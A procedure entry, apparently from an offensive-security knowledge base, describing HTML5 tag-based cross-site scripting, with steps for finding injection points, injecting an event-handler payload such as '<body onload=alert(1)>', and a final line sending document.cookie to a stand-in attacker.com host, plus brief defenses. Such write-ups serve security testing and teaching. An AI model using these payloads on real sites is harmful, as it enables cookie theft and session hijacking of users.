---
id: 93d73f96-13fe-47be-912e-a2472f6e3812
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:41.825734+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - cross-site-scripting
  - xss
  - html5-tags
  - web-application
commands: []
platforms:
  - Web
tools: []
validated: true
---

# HTML5-Tag-Based-Cross-Site-Scripting

## Summary

This procedure demonstrates how to perform cross-site scripting (XSS) attacks using HTML5 tags and associated JavaScript events to inject and execute malicious code in a victim's browser. It targets web applications with insufficient input sanitization, allowing attackers to steal session tokens, cookies, or other sensitive data by leveraging events like onload, onfocus, and onerror triggered by HTML5 elements such as video, audio, and input fields.

## Description

HTML5 tag-based XSS exploits the rendering and event-handling capabilities of modern browsers by injecting HTML elements with inline JavaScript event handlers into user-controllable inputs, such as search fields, comments, or URL parameters. When the victim loads the page, the browser parses the injected tags and fires the events, executing the payload without needing traditional <script> tags, which may be filtered. This technique is effective against applications using HTML5 features like media elements (video, audio) or form controls (input, select), and it can bypass basic XSS filters that focus on script tags. The attack requires a vulnerable input point and victim interaction, typically resulting in data exfiltration to an attacker-controlled server or immediate execution of alerts for proof-of-concept testing. It applies to client-side execution in web environments, often in conjunction with reflected, stored, or DOM-based XSS vectors.

## Requirements

1. Access to a web application with unsanitized inputs that render HTML (e.g., via forms, query parameters, or user-generated content).
2. Knowledge of the application's input points and any existing filters to craft bypassing payloads.
3. A testing environment or victim browser to observe execution (e.g., Burp Suite for interception or a local server for payload delivery).
4. Basic understanding of HTML5 elements and JavaScript events.

## Defense

- Implement strict input validation and output encoding using libraries like DOMPurify or built-in sanitizers to strip or escape HTML tags and event handlers.
- Deploy Content Security Policy (CSP) headers to restrict inline JavaScript execution and limit script sources to trusted domains.
- Use Web Application Firewalls (WAFs) with XSS rules to detect and block common payloads, including HTML5 event patterns.
- Regularly scan for vulnerabilities with tools like OWASP ZAP or conduct code reviews focusing on HTML rendering contexts.

## Objectives

1. Identify and exploit input fields vulnerable to HTML injection in a web application.
2. Inject HTML5 tag-based payloads to execute JavaScript in the victim's browser context.
3. Achieve data theft, such as capturing cookies or session tokens, or demonstrate control via alerts.

## Instructions

### Step 1: Identify Vulnerable Input Points

**Context**: Locate areas in the web application where user input is reflected back without proper sanitization, such as search boxes, profile fields, or URL parameters that render HTML. Use browser developer tools or a proxy like Burp Suite to inspect how inputs are processed.

Inspect the page source or use manual fuzzing with benign HTML to check for injection points. For example, submit '<test>' and see if it renders as text or tags.

### Step 2: Select and Customize Payloads

**Context**: Choose from a set of HTML5 tag-based XSS payloads that leverage events to execute code. These payloads use elements like <body>, <input>, <video>, and touch events for mobile compatibility. Customize if needed to exfiltrate data, e.g., replace alert(1) with a fetch to an attacker server.

**Code** ([[codes/HTML5-Tag-Based-XSS-Payloads]]):

Embed the payload in the vulnerable input. For instance, in a reflected search parameter: https://vulnerable-site.com/search?q=<body+onload=alert(1)>

### Step 3: Inject and Test the Payload

**Context**: Submit the payload through the identified input and observe execution in the victim's session. If using a proxy, intercept and modify requests to ensure the payload reaches the response unfiltered.

Submit the input and load the resulting page. For stored XSS, save the input and access the page as the victim. Verify execution by checking for the alert or network requests to your server.

### Step 4: Verify and Exfiltrate Data

**Context**: Confirm the XSS by executing a benign payload, then escalate to data theft. Monitor for success indicators like popped alerts or received data on your endpoint.

If successful, the payload executes client-side, allowing access to document.cookie or localStorage. For exfiltration, modify the payload to send data via XMLHttpRequest to http://attacker.com/steal?data='+document.cookie.
